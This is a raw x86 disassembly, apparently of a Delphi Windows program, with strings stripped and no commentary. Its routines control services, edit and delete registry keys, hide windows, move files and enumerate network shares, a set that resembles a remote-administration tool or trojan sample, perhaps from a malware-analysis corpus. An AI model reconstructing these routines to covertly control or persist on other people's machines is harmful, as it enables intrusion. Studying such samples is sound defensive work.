mov edx r-xdata
call sub_4055c8
jmp r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_405718
push [ ebp - 0x2c ]
push r-xdata
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x6
call sub_4058e0
sub_46d9e0
push ebx
add esp 0xffffffe8
mov ebx eax
mov [ esp ] 0x10
push esp
lea eax [ esp + 0x8 ]
push eax
call GetComputerNameA
mov eax ebx
lea edx [ esp + 0x4 ]
mov ecx 0x11
call sub_4057a0
add esp 0x18
pop ebx
retn
sub_46da2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4059dc
push eax
mov eax ebx
call sub_4059dc
push eax
call MoveFileA
cmp eax 0x1
sbb eax eax
inc eax
pop esi
pop ebx
retn
sub_46da50
push 0x0
push r-xdata
call FindWindowA
push 0x0
push r-xdata
push 0x0
push eax
call FindWindowExA
push 0x0
push r-xdata
push 0x0
push eax
call FindWindowExA
push 0x0
push eax
call ShowWindow
retn
sub_46dab4
push 0x0
push r-xdata
call FindWindowA
push 0x0
push r-xdata
push 0x0
push eax
call FindWindowExA
push 0x0
push r-xdata
push 0x0
push eax
call FindWindowExA
push 0x5
push eax
call ShowWindow
retn
sub_46dc70
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_46dd2b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xf003f
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call OpenSCManagerA
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dd32
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
xor eax eax
push ebp
push sub_46dd09
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xf01ff
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
mov eax [ ebp - 0xc ]
push eax
call OpenServiceA
mov ebx eax
lea eax [ ebp - 0x28 ]
push eax
push 0x1
push ebx
call ControlService
push ebx
call CloseServiceHandle
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call CloseServiceHandle
retn
sub_46dd38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_46ddf8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xf003f
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call OpenSCManagerA
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ddff
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
xor eax eax
push ebp
push sub_46ddd6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xf01ff
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
mov eax [ ebp - 0xc ]
push eax
call OpenServiceA
mov ebx eax
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push ebx
call StartServiceA
push ebx
call CloseServiceHandle
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call CloseServiceHandle
retn
sub_46de04
push ebp
mov ebp esp
add esp 0xfffffdcc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x234 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46df1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_405530
mov edx ebx
mov eax 0x8
call sub_460d3c
mov esi eax
mov [ ebp - 0x230 ] 0x224
lea edx [ ebp - 0x230 ]
mov eax esi
call sub_460d9c
cmp eax 0x1
sbb ebx ebx
inc ebx
jmp r-xdata
test bl bl
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx 0x8
xor eax eax
call sub_409e84
mov eax [ ebp - 0x218 ]
xor edx edx
push edx
push eax
lea edx [ ebp - 0xc ]
mov eax 0x8
call sub_409eac
push [ ebp - 0x4 ]
lea eax [ ebp - 0x234 ]
lea edx [ ebp - 0x110 ]
mov ecx 0x104
call sub_4057a0
push [ ebp - 0x234 ]
push r-xdata
push r-xdata
push [ ebp - 0xc ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x7
call sub_4058e0
lea edx [ ebp - 0x230 ]
mov eax esi
call sub_460dbc
cmp eax 0x1
sbb ebx ebx
inc ebx
push esi
call CloseHandle
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46df24
lea eax [ ebp - 0x234 ]
call sub_405530
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
sub_46df5c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_46e0ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_409edc
cmp eax 0x5
ja r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e0d5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
jmp [ eax * 4 + jump_table_46df9e ]
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x20006
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000000
call RegCreateKeyExA
jmp r-xdata
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x20006
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000001
call RegCreateKeyExA
jmp r-xdata
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x20006
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000002
call RegCreateKeyExA
jmp r-xdata
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x20006
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000003
call RegCreateKeyExA
jmp r-xdata
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x20006
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000005
call RegCreateKeyExA
jmp r-xdata
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x20006
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000006
call RegCreateKeyExA
sub_46e0dc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp - 0xc ]
call sub_4059cc
xor eax eax
push ebp
push sub_46e238
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_409edc
cmp eax 0x5
ja r-xdata
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
mov eax [ ebp - 0x10 ]
push eax
call RegDeleteValueA
mov eax [ ebp - 0x10 ]
push eax
call RegCloseKey
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e23f
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
jmp [ eax * 4 + jump_table_46e129 ]
lea eax [ ebp - 0x10 ]
push eax
push 0xf003f
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000000
call RegOpenKeyExA
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0xf003f
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000001
call RegOpenKeyExA
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0xf003f
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000002
call RegOpenKeyExA
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0xf003f
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000003
call RegOpenKeyExA
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0xf003f
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000005
call RegOpenKeyExA
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0xf003f
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000006
call RegOpenKeyExA
sub_46e244
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_46e391
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_409edc
cmp eax 0x5
ja r-xdata
push sub_46e39c
mov eax [ ebp - 0xc ]
push eax
call RegDeleteKeyA
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e398
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
jmp [ eax * 4 + jump_table_46e286 ]
lea eax [ ebp - 0xc ]
push eax
push 0xf003f
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000000
call RegOpenKeyExA
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xf003f
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000001
call RegOpenKeyExA
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xf003f
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000002
call RegOpenKeyExA
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xf003f
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000003
call RegOpenKeyExA
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xf003f
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000005
call RegOpenKeyExA
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xf003f
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x80000006
call RegOpenKeyExA
sub_46e39c
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e3e6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e3ed
retn
mov eax rw-data
call sub_405530
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4060f8
sub_46e3f0
push ebp
mov ebp esp
add esp 0xfffffed4
push ebx
xor ebx ebx
mov [ ebp - 0x12c ] ebx
mov [ ebp - 0x128 ] ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp - 0xc ]
call sub_4059cc
xor eax eax
push ebp
push sub_46e55e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x18 ]
push eax
push 0x10
push 0x0
call SHGetSpecialFolderLocation
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e565
lea eax [ ebp - 0x12c ]
call sub_40700c
lea eax [ ebp - 0x128 ]
call sub_405530
lea eax [ ebp - 0x124 ]
call sub_40700c
lea eax [ ebp - 0x14 ]
call sub_40700c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SHGetPathFromIDListA
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
call sub_42be44
mov edx [ ebp - 0x124 ]
lea eax [ ebp - 0x14 ]
mov ecx r-xdata
call sub_407050
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x50 ]
push 0x5
mov eax [ ebp - 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x3c ]
lea eax [ ebp - 0x128 ]
lea edx [ ebp - 0x11d ]
mov ecx 0x105
call sub_4057a0
push [ ebp - 0x128 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4058e0
push 0xffffffff
mov eax [ ebp - 0x10 ]
call sub_40646c
push eax
lea eax [ ebp - 0x12c ]
mov edx [ ebp - 0x14 ]
mov ecx r-xdata
call sub_407050
mov eax [ ebp - 0x12c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_46e5b0
push ebx
add esp 0xfffffe68
xor ebx ebx
push 0x0
push 0x2c
lea eax [ esp + 0x160 ]
push eax
push 0x0
call NtQuerySystemInformation
test eax eax
jne r-xdata
mov eax ebx
add esp 0x198
pop ebx
retn
push 0x0
push 0x20
lea eax [ esp + 0x140 ]
push eax
push 0x3
call NtQuerySystemInformation
test eax eax
jne r-xdata
push 0x0
push 0x138
lea eax [ esp + 0x8 ]
push eax
push 0x2
call NtQuerySystemInformation
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
je r-xdata
cmp [ rw-data ] 0x0
mov eax [ esp ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x140 ]
mov [ rw-data ] eax
mov eax [ esp + 0x144 ]
mov [ rw-data ] eax
mov eax [ esp ]
mov edx [ esp + 0x4 ]
sub eax [ rw-data ]
sbb edx [ rw-data ]
mov [ esp + 0x184 ] eax
mov [ esp + 0x188 ] edx
fild [ esp + 0x184 ]
mov eax [ esp + 0x140 ]
mov edx [ esp + 0x144 ]
sub eax [ rw-data ]
sbb edx [ rw-data ]
mov [ esp + 0x18c ] eax
mov [ esp + 0x190 ] edx
fild [ esp + 0x18c ]
fdivp st1
fmul [ r-xdata ]
movzx eax [ esp + 0x180 ]
mov [ esp + 0x194 ] eax
fild [ esp + 0x194 ]
fdivp st1
fsubr [ r-xdata ]
fadd [ r-xdata ]
call sub_40345c
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
cmp edx [ rw-data ]
jne r-xdata
je r-xdata
cmp eax [ rw-data ]
mov ebx [ rw-data ]
sub_46e724
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_46e984
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4032f8
test eax eax
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x1
call sub_403358
mov eax [ ebp - 0x1c ]
call sub_4059dc
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e98b
lea eax [ ebp - 0x40 ]
mov edx 0xa
call sub_405554
retn
mov edi [ ebp - 0x8 ]
mov esi [ ebp - 0x10 ]
test esi esi
jle r-xdata
mov eax ebx
call sub_405530
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call NetShareEnum
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
call NetApiBufferFree
xor edx edx
push ebp
push sub_46e945
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0xc ]
push eax
push 0x1f6
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call NetShareGetInfo
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
call NetApiBufferFree
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov edx [ edx ]
call sub_405728
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_405818
push [ ebx ]
push r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x24 ]
call sub_409e5c
push [ ebp - 0x24 ]
mov eax ebx
mov edx 0x3
call sub_4058e0
push [ ebx ]
push r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x8 ]
call sub_405728
push [ ebp - 0x28 ]
mov eax ebx
mov edx 0x3
call sub_4058e0
push [ ebx ]
push r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x2c ]
call sub_409e5c
push [ ebp - 0x2c ]
mov eax ebx
mov edx 0x3
call sub_4058e0
push [ ebx ]
push r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_409e5c
push [ ebp - 0x30 ]
mov eax ebx
mov edx 0x3
call sub_4058e0
push [ ebx ]
push r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_409e5c
push [ ebp - 0x34 ]
mov eax ebx
mov edx 0x3
call sub_4058e0
push [ ebx ]
push r-xdata
lea eax [ ebp - 0x38 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x18 ]
call sub_405728
push [ ebp - 0x38 ]
mov eax ebx
mov edx 0x3
call sub_4058e0
push [ ebx ]
push r-xdata
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x1c ]
call sub_405728
push [ ebp - 0x3c ]
mov eax ebx
mov edx 0x3
call sub_4058e0
push [ ebx ]
push r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x20 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x40 ]
call sub_409e5c
push [ ebp - 0x40 ]
push r-xdata
mov eax ebx
mov edx 0x4
call sub_4058e0
add edi 0x4
dec esi
jne r-xdata
sub_46e9ac
xor edx edx
cmp eax 0x4
ja r-xdata
mov eax edx
retn
jmp [ eax * 4 + jump_table_46e9ba ]
mov edx 0x80000000
mov eax edx
retn
mov edx 0x80000001
mov eax edx
retn
mov edx 0x80000002
mov eax edx
retn
mov edx 0x80000003
mov eax edx
retn
mov edx 0x80000005
sub_46e9f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_46eaa8
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_409edc
call sub_46e9ac
mov edx eax
mov eax ebx
call sub_4217a0
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4218e4
mov edx esi
mov eax ebx
call sub_421dd8
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax ebx
call sub_421770
mov eax ebx
call sub_404650
mov eax esi
call sub_404650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eaaf
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_46eab8
push ebp
mov ebp esp
push ecx
mov ecx 0x29
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_46ee22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_405530
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
call sub_409edc
call sub_46e9ac
xor edx edx
push ebp
push sub_46ede6
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_46edd5
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
mov eax [ ebp - 0x14 ]
call sub_4217a0
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_4218e4
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_421ea0
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eddc
mov eax [ ebp - 0x14 ]
call sub_421770
mov eax [ ebp - 0x14 ]
call sub_404650
mov eax [ ebp - 0x18 ]
call sub_404650
retn
inc eax
mov [ ebp - 0x1c ] eax
xor esi esi
cmp bl 0x3
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4055c8
mov eax [ ebp - 0x10 ]
push [ eax ]
lea ecx [ ebp - 0x124 ]
mov edx esi
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x124 ]
push r-xdata
push [ ebp - 0xc ]
push r-xdata
lea ecx [ ebp - 0x12c ]
mov edx esi
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x12c ]
lea ecx [ ebp - 0x128 ]
mov eax [ ebp - 0x14 ]
call sub_422068
push [ ebp - 0x128 ]
push r-xdata
mov eax [ ebp - 0x10 ]
mov edx 0x7
call sub_4058e0
jmp r-xdata
cmp bl 0x2
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4055c8
mov eax [ ebp - 0x10 ]
push [ eax ]
lea ecx [ ebp - 0x130 ]
mov edx esi
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x130 ]
push r-xdata
push [ ebp - 0xc ]
push r-xdata
lea ecx [ ebp - 0x138 ]
mov edx esi
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x14 ]
call sub_4220f4
lea edx [ ebp - 0x134 ]
call sub_409d70
push [ ebp - 0x134 ]
push r-xdata
mov eax [ ebp - 0x10 ]
mov edx 0x7
call sub_4058e0
jmp r-xdata
cmp bl 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4055c8
mov eax [ ebp - 0x10 ]
push [ eax ]
lea ecx [ ebp - 0x13c ]
mov edx esi
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x13c ]
push r-xdata
push [ ebp - 0xc ]
push r-xdata
lea ecx [ ebp - 0x144 ]
mov edx esi
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x140 ]
mov eax [ ebp - 0x14 ]
call sub_422068
push [ ebp - 0x140 ]
push r-xdata
mov eax [ ebp - 0x10 ]
mov edx 0x7
call sub_4058e0
inc esi
dec [ ebp - 0x1c ]
jne r-xdata
push 0x100
lea ecx [ ebp - 0x148 ]
mov edx esi
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x148 ]
lea ecx [ ebp - 0x11c ]
mov eax [ ebp - 0x14 ]
call sub_422124
test eax eax
jle r-xdata
lea ecx [ ebp - 0x120 ]
mov edx esi
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x120 ]
mov eax [ ebp - 0x14 ]
call sub_421fe0
mov ebx eax
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
push [ eax ]
lea ecx [ ebp - 0x14c ]
mov edx esi
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x14c ]
push r-xdata
push [ ebp - 0xc ]
push r-xdata
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x11c ]
mov ecx 0x100
call sub_4057a0
push [ ebp - 0x150 ]
push r-xdata
mov eax [ ebp - 0x10 ]
mov edx 0x7
call sub_4058e0
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4055c8
sub_46eddc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ee29
lea eax [ ebp - 0x150 ]
mov edx 0xd
call sub_405554
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
sub_46edf2
call sub_404f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ee29
lea eax [ ebp - 0x150 ]
mov edx 0xd
call sub_405554
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
sub_46ee98
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp - 0xc ]
call sub_4059cc
mov eax [ ebp + 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_46ef73
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_409edc
call sub_46e9ac
xor edx edx
push ebp
push sub_46ef49
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_4217a0
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4218e4
mov eax [ ebp + 0x8 ]
call sub_409edc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4220e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ef50
mov eax [ ebp - 0x10 ]
call sub_421770
mov eax [ ebp - 0x10 ]
call sub_404650
retn
sub_46ef80
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp - 0xc ]
call sub_4059cc
mov eax [ ebp + 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_46f054
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_409edc
call sub_46e9ac
xor edx edx
push ebp
push sub_46f02a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_4217a0
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4218e4
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_422038
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f031
mov eax [ ebp - 0x10 ]
call sub_421770
mov eax [ ebp - 0x10 ]
call sub_404650
retn
sub_46f064
push ebp
mov ebp esp
add esp 0xfffffff0
